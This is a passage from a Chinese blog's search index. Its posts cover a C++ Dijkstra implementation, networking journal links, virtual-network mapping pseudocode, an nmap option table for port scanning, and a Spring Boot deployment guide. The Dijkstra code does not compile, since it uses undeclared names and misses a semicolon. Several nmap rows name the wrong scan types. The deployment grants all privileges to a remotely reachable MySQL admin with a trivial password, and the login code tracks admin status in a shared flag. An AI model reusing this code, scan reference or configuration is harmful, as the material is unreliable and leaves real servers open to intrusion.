        <content type="html"><![CDATA[<p>求最短路的算法只记得Floyd，单源最短路Dijstra差点忘了<del>已经忘了</del></p><a id="more"></a><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Link</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> from,to,dist;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> d,u;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> HeapNode &amp; a) <span class="keyword">const</span>&#123;</span><br><span class="line"><span class="keyword">return</span> d &gt; a.d;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SubstrateNetwork</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> nodes;</span><br><span class="line"><span class="keyword">int</span> links</span><br><span class="line"><span class="built_in">vector</span>&lt;Link&gt; maplinks;</span><br><span class="line"><span class="keyword">bool</span> isvisited[nodes+<span class="number">1</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; G[nodes+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> distance[nodes+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> p[nodes+<span class="number">1</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;n = n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= n;i++)G[i].clear();</span><br><span class="line"><span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span> vis);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= n;i++)p[i] = i;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++)d[i] = INF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</span><br><span class="line">priority_queue&lt;Node&gt; q;</span><br><span class="line">q.push(Node&#123;<span class="number">0</span>,s&#125;);</span><br><span class="line">distance[s] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">Node temp = q.top();</span><br><span class="line">q.pop();</span><br><span class="line"><span class="keyword">int</span> u = temp.u;</span><br><span class="line"><span class="keyword">if</span>(isvisited[u])</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">isvisited[u]=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;G[u].size();i++)&#123;</span><br><span class="line">Link e = maplinks[G[u][i]];</span><br><span class="line"><span class="keyword">if</span>(distance[e.to] &gt; distance[u] + e.dist)&#123;</span><br><span class="line">distance[e.to] = distance[u] + e.dist;</span><br><span class="line">p[e.to] = u;</span><br><span class="line">q.push(HeapNode&#123;distance[e.to],e.to&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些网页链接</title>
      <link href="/2018/12/08/2018-12-08-%E7%BD%91%E9%A1%B5%E9%93%BE%E6%8E%A5/"/>
      <url>/2018/12/08/2018-12-08-%E7%BD%91%E9%A1%B5%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<p>网络原理相关期刊</p><a id="more"></a><h1 id="顶级期刊"><a href="#顶级期刊" class="headerlink" title="顶级期刊"></a>顶级期刊</h1><h2 id="名称：ieee-network"><a href="#名称：ieee-network" class="headerlink" title="名称：ieee network"></a>名称：ieee network</h2><h2 id="主页网址："><a href="#主页网址：" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://ieeexplore.ieee.org/xpl/RecentIssue.jsp?punumber=65" target="_blank" rel="noopener">ieee network</a></p><h2 id="名称：journal-of-network-and-computer-applications"><a href="#名称：journal-of-network-and-computer-applications" class="headerlink" title="名称：journal of network and computer applications"></a>名称：journal of network and computer applications</h2><h2 id="主页网址：-1"><a href="#主页网址：-1" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://www.sciencedirect.com/science/journal/10848045" target="_blank" rel="noopener">journal of network and computer applications</a></p><h2 id="名称：ieee-acm-transactions-on-networking"><a href="#名称：ieee-acm-transactions-on-networking" class="headerlink" title="名称：ieee-acm transactions on networking"></a>名称：ieee-acm transactions on networking</h2><h2 id="主页网址：-2"><a href="#主页网址：-2" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://ieeexplore.ieee.org/xpl/RecentIssue.jsp?punumber=90" target="_blank" rel="noopener">ieee-acm transactions on networking</a></p><h2 id="名称：Ad-Hoc-Networks"><a href="#名称：Ad-Hoc-Networks" class="headerlink" title="名称：Ad Hoc Networks"></a>名称：Ad Hoc Networks</h2><h2 id="主页网址：-3"><a href="#主页网址：-3" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://www.sciencedirect.com/science/journal/15708705" target="_blank" rel="noopener">Ad Hoc Networks</a></p><h2 id="名称：cluster-computing-the-journal-of-networks-software-tools-and-applications"><a href="#名称：cluster-computing-the-journal-of-networks-software-tools-and-applications" class="headerlink" title="名称：cluster computing-the journal of networks software tools and applications"></a>名称：cluster computing-the journal of networks software tools and applications</h2><h2 id="主页网址：-4"><a href="#主页网址：-4" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://link.springer.com/journal/10586" target="_blank" rel="noopener">cluster computing-the journal of networks software tools and applications</a></p><h2 id="名称：Computer-Networks"><a href="#名称：Computer-Networks" class="headerlink" title="名称：Computer Networks"></a>名称：Computer Networks</h2><h2 id="主页网址：-5"><a href="#主页网址：-5" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://www.sciencedirect.com/science/journal/13891286" target="_blank" rel="noopener">Computer Networks</a></p><h2 id="名称：Optical-Switching-and-Networking"><a href="#名称：Optical-Switching-and-Networking" class="headerlink" title="名称：Optical Switching and Networking"></a>名称：Optical Switching and Networking</h2><h2 id="主页网址：-6"><a href="#主页网址：-6" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://www.sciencedirect.com/science/journal/15734277" target="_blank" rel="noopener">Optical Switching and Networking</a></p><h2 id="名称：Mobile-Networks-and-Applications"><a href="#名称：Mobile-Networks-and-Applications" class="headerlink" title="名称：Mobile Networks and Applications"></a>名称：Mobile Networks and Applications</h2><h2 id="主页网址：-7"><a href="#主页网址：-7" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://link.springer.com/journal/11036" target="_blank" rel="noopener">Mobile Networks and Applications</a></p><h2 id="名称：Wireless-Networks"><a href="#名称：Wireless-Networks" class="headerlink" title="名称：Wireless Networks"></a>名称：Wireless Networks</h2><h2 id="主页网址：-8"><a href="#主页网址：-8" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://link.springer.com/journal/11276" target="_blank" rel="noopener">Wireless Networks</a></p><h2 id="名称：Networks"><a href="#名称：Networks" class="headerlink" title="名称：Networks"></a>名称：Networks</h2><h2 id="主页网址：-9"><a href="#主页网址：-9" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://onlinelibrary.wiley.com/journal/" target="_blank" rel="noopener">Networks</a></p><h2 id="名称：Journal-of-Network-and-Systems-Management"><a href="#名称：Journal-of-Network-and-Systems-Management" class="headerlink" title="名称：Journal of Network and Systems Management"></a>名称：Journal of Network and Systems Management</h2><h2 id="主页网址：-10"><a href="#主页网址：-10" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://link.springer.com/journal/10922" target="_blank" rel="noopener">Journal of Network and Systems Management</a></p><h1 id="顶级会议："><a href="#顶级会议：" class="headerlink" title="顶级会议："></a>顶级会议：</h1><h2 id="名称：acm-sigcomm"><a href="#名称：acm-sigcomm" class="headerlink" title="名称：acm sigcomm"></a>名称：acm sigcomm</h2><h2 id="主页网址：-11"><a href="#主页网址：-11" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://www.sigcomm.org/" target="_blank" rel="noopener">acm sigcomm</a></p><h2 id="名称-ieee-infocom"><a href="#名称-ieee-infocom" class="headerlink" title="名称: ieee infocom"></a>名称: ieee infocom</h2><h2 id="主页网址：-12"><a href="#主页网址：-12" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://infocom2017.ieee-infocom.org/" target="_blank" rel="noopener">ieee infocom</a></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> paper </tag>
            
            <tag> url </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>映射过程描述</title>
      <link href="/2018/12/01/2018-12-01-%E6%98%A0%E5%B0%84%E8%BF%87%E7%A8%8B%E6%8F%8F%E8%BF%B0/"/>
      <url>/2018/12/01/2018-12-01-%E6%98%A0%E5%B0%84%E8%BF%87%E7%A8%8B%E6%8F%8F%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p>虚拟网络映射算法的节点、链路映射一般过程</p><a id="more"></a><h1 id="映射过程"><a href="#映射过程" class="headerlink" title="映射过程"></a>映射过程</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(request:requestList)&#123;</span><br><span class="line">映射成功标记 flag</span><br><span class="line">① flag = 节点映射结果</span><br><span class="line"><span class="keyword">if</span>(falg)  节点资源分配 执行②部分</span><br><span class="line"><span class="keyword">else</span> 本组request映射失败</span><br><span class="line">② flag = 链路映射结果</span><br><span class="line"><span class="keyword">if</span>(falg)  链路资源分配</span><br><span class="line"><span class="keyword">else</span> 本组request映射失败</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="节点映射过程"><a href="#节点映射过程" class="headerlink" title="节点映射过程"></a>节点映射过程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">排序物理网络、网络请求的节点;<span class="comment">//每一次按改进的H值（加入负载均衡系数后）对物理网络进行排序</span></span><br><span class="line"><span class="keyword">for</span>( vn_node : vn_nodes)&#123;<span class="comment">//对每一个排序后的虚拟节点</span></span><br><span class="line"><span class="keyword">for</span>(遍历物理节点)&#123;</span><br><span class="line"><span class="keyword">if</span>(物理节点节点剩余CPU &gt; 虚拟节点CPU需求)&#123;</span><br><span class="line">存储映射结果，跳出<span class="keyword">for</span>循环，映射下一个节点</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(物理节点遍历结束)&#123;</span><br><span class="line">映射失败,返回<span class="keyword">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">节点映射成功，分配物理节点资源</span><br></pre></td></tr></table></figure><h2 id="链路映射过程"><a href="#链路映射过程" class="headerlink" title="链路映射过程"></a>链路映射过程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span>(vn_link :vn_links)&#123;<span class="comment">//对每一个request的链路请求</span></span><br><span class="line">       取出链路需求带宽，起、止节点id</span><br><span class="line">       根据起止节点id(from,to)查找最短路径 floyd</span><br><span class="line">       <span class="keyword">if</span>(finded)&#123;</span><br><span class="line"> <span class="comment">//找到链路后验证带宽</span></span><br><span class="line"><span class="keyword">if</span>(链路需求带宽 &gt; 物理链路剩余带宽)  映射失败;</span><br><span class="line"> <span class="keyword">else</span> 将这一条链路加入resultLinks（链路映射最终结果）</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">false</span>;<span class="comment">//链路不通，映射失败</span></span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap zmap使用</title>
      <link href="/2018/12/01/2018-12-01-nmap&amp;zmap/"/>
      <url>/2018/12/01/2018-12-01-nmap&amp;zmap/</url>
      
        <content type="html"><![CDATA[<p>nmap 和 zmap的参数表，端口嗅探</p><a id="more"></a><hr><h2 id="参数表"><a href="#参数表" class="headerlink" title="参数表"></a>参数表</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nmap_param.png" alt title>                </div>                <div class="image-caption"></div>            </figure><table><thead><tr><th align="center">参数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-sL</td><td align="center">TCP SYN</td></tr><tr><td align="center">-sT</td><td align="center">Connect</td></tr><tr><td align="center">-sA</td><td align="center">ACK</td></tr><tr><td align="center">-sW</td><td align="center">Window</td></tr><tr><td align="center">-sM</td><td align="center">Maimon scans</td></tr><tr><td align="center">-sU</td><td align="center">UDP scan</td></tr><tr><td align="center">-sN</td><td align="center">TCP NULL</td></tr><tr><td align="center">-sF</td><td align="center">FIN</td></tr><tr><td align="center">-sX</td><td align="center">Xmax scans</td></tr><tr><td align="center">-sI host:probeport]</td><td align="center">zombie host scan</td></tr><tr><td align="center">-sY</td><td align="center">SCTP INIT</td></tr><tr><td align="center">-sZ</td><td align="center">Cookie-echo scans</td></tr><tr><td align="center">-sO</td><td align="center">IP protocol scan</td></tr><tr><td align="center">-b FTPserver</td><td align="center">FTP bounce scan</td></tr></tbody></table><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nmaphostscan.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>参照的详解文章<br>[<a href="https://www.cnblogs.com/nmap/p/6232969.html]" target="_blank" rel="noopener">https://www.cnblogs.com/nmap/p/6232969.html]</a></li></ul><table><thead><tr><th align="center">参数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-sL</td><td align="center">TCP SYN</td></tr><tr><td align="center">-sn</td><td align="center">Ping Scan - disable port scan（测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态）</td></tr><tr><td align="center">-sS</td><td align="center">发送SYN包到远程主机，但不会产生任何会话，目标主机不会把连接记入系统日志。（为了防止对方判断为扫描攻击，目前挺多加防服务器直接会把扫自己端口的的ip拉黑）</td></tr><tr><td align="center">-sA</td><td align="center">Connect，探测主机是否开机</td></tr><tr><td align="center">-PE</td><td align="center">Connect</td></tr><tr><td align="center">-PS80</td><td align="center">ACK</td></tr><tr><td align="center">-PR</td><td align="center">Window</td></tr><tr><td align="center">-Pn</td><td align="center">无ping扫描</td></tr><tr><td align="center">-sP</td><td align="center">快速ping，扫描本地局域网有那些机器，或者直接可以用前缀式表示类似于x.x.x.0/24</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sniffer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springboot+modleView+rmi调用自己写的天气预报的新闻系统</title>
      <link href="/2018/11/30/2018-11-30-newsSystem/"/>
      <url>/2018/11/30/2018-11-30-newsSystem/</url>
      
        <content type="html"><![CDATA[<p>一个springboot(collect springmvc、hibernate、modleView）+rmi远程调用天气预报系统的小项目</p><a id="more"></a><h1 id="newsSystem"><a href="#newsSystem" class="headerlink" title="newsSystem"></a>newsSystem</h1><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fgo1.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><blockquote><p>先放上作业的代码地址</p></blockquote><h2 id="新闻系统"><a href="#新闻系统" class="headerlink" title="新闻系统"></a>新闻系统</h2><ul><li><a href="https://github.com/waynamigo/newsSystem" target="_blank" rel="noopener">newsSystem</a></li></ul><h2 id="下面是在centos服务器上部署环境，建一个新数据库用户进行管理"><a href="#下面是在centos服务器上部署环境，建一个新数据库用户进行管理" class="headerlink" title="下面是在centos服务器上部署环境，建一个新数据库用户进行管理"></a>下面是在centos服务器上部署环境，建一个新数据库用户进行管理</h2><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install mysql mysql-server mysql-devel</span><br><span class="line">create user newsadmin;</span><br><span class="line">create database newsbase;</span><br><span class="line">grant all privileges on newsbase.* to newsadmin@localhost identified by<span class="string">'password'</span>;</span><br><span class="line">revoke all on *.* from <span class="string">'admin'</span>@<span class="string">'%'</span>;</span><br><span class="line">grant all on *.* to <span class="string">'admin'</span>@<span class="string">'%'</span> identified by <span class="string">'wdnm'</span></span><br></pre></td></tr></table></figure><ul><li>数据库用户名，密码在application.yml文件中配置</li></ul><h2 id="服务器环境"><a href="#服务器环境" class="headerlink" title="服务器环境"></a>服务器环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install java-1.8.0-openjdk-devel</span><br><span class="line">安装maven到usr/<span class="built_in">local</span>/apache-maven</span><br><span class="line"><span class="built_in">export</span> MAVEN_HOME=/usr/<span class="built_in">local</span>/apache-maven</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;MAVEN_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line">服务器端Could not find or load main class org.apache.maven.wrapper.MavenWrapperMain</span><br><span class="line">错误解决：mvn io.takari:maven:wrapper</span><br></pre></td></tr></table></figure><ul><li>环境变量别写错<h2 id="mysql服务没启动的错误，很奇妙"><a href="#mysql服务没启动的错误，很奇妙" class="headerlink" title="mysql服务没启动的错误，很奇妙"></a>mysql服务没启动的错误，很奇妙</h2></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/rc.d/init.d/mysqld status </span><br><span class="line"></span><br><span class="line">/etc/init.d/mysqld start</span><br></pre></td></tr></table></figure><h2 id="创建项目文件夹"><a href="#创建项目文件夹" class="headerlink" title="创建项目文件夹"></a>创建项目文件夹</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /classdesign</span><br><span class="line">chmod 754 /classdesign</span><br></pre></td></tr></table></figure><h2 id="运行项目"><a href="#运行项目" class="headerlink" title="运行项目"></a>运行项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nohup java -jar newsSystem.jar &gt; springbootinfo.out 2&gt;&amp;1  &amp;</span><br><span class="line">或</span><br><span class="line">nohup ./mvnw spring-boot:run &gt; springbootinfo.out 2&gt;&amp;1  &amp;</span><br></pre></td></tr></table></figure><hr><h2 id="代码高亮测试"><a href="#代码高亮测试" class="headerlink" title="代码高亮测试"></a>代码高亮测试</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Controller</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserService userService=<span class="keyword">new</span> UserService();</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    NewsService newsService=<span class="keyword">new</span> NewsService();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> isadmin = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Logger logger = Logger.getLogger(PageController.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/login/"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(@RequestParam(value = <span class="string">"username"</span>, defaultValue = <span class="string">"null"</span>)</span> String name,</span></span><br><span class="line"><span class="function">                        @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"password"</span>, defaultValue = <span class="string">"null"</span>)</span> String password,</span></span><br><span class="line"><span class="function">                        Model model)</span>&#123;<span class="comment">//String username, String password,Model model</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            User user = userService.findUser(name,password);</span><br><span class="line">            <span class="keyword">if</span> (user!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                model.addAttribute(<span class="string">"user"</span>,user);</span><br><span class="line">                <span class="keyword">if</span>(user.getId()==<span class="number">1</span>)&#123;</span><br><span class="line">                    logger.info(<span class="string">"admin status"</span>);</span><br><span class="line">                    isadmin=<span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                logger.info(<span class="string">"login success:username="</span>+name);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"redirect:/newspage/"</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                model.addAttribute(<span class="string">"msg"</span>,<span class="string">"nosuchuser"</span>);</span><br><span class="line">                logger.info(<span class="string">"login failed:no such user"</span>);</span><br><span class="line">               <span class="comment">// return "success";</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="latex-math测试"><a href="#latex-math测试" class="headerlink" title="latex math测试"></a>latex math测试</h3><p>$$[\begin{matrix} a&amp;b\\c&amp;d \end{matrix}\quad<br>\begin{pmatrix} a&amp;b\\c&amp;d \end{pmatrix}\quad<br>\begin{bmatrix} a&amp;b\\c&amp;d \end{bmatrix}\quad<br>\begin{Bmatrix} a&amp;b\\c&amp;d \end{Bmatrix}\quad<br>\begin{vmatrix} a&amp;b\\c&amp;d \end{vmatrix}\quad<br>\begin{Vmatrix} a&amp;b\\c&amp;d \end{Vmatrix}\quad]$$</p><h1 id="数据库内容"><a href="#数据库内容" class="headerlink" title="数据库内容"></a>数据库内容</h1><table><thead><tr><th>Tables_in_newsbase</th></tr></thead><tbody><tr><td>hibernate_sequence</td></tr><tr><td>news</td></tr><tr><td>user</td></tr><tr><td>——————–</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> springboot </tag>
            
            <tag> rmi </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
